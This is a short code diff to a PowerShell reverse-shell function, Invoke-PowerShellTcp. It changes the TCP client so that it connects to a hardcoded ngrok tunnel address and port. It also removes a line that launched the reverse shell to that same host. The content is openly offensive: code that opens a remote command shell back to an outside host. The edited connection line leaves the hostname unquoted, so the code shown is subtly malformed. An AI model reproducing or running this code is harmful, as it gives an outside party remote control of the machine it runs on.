@@ -24,7 +24,7 @@ function Invoke-PowerShellTcp
     {
         if ($Reverse)
         {
-            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
+            $client = New-Object System.Net.Sockets.TCPClient(0.tcp.ap.ngrok.io,15271)
         }
 
         if ($Bind)
@@ -78,5 +78,3 @@ function Invoke-PowerShellTcp
     }
 }
 
-# 🔥 Launch reverse shell to ngrok
-Invoke-PowerShellTcp -Reverse -IPAddress "0.tcp.ap.ngrok.io" -Port 15271
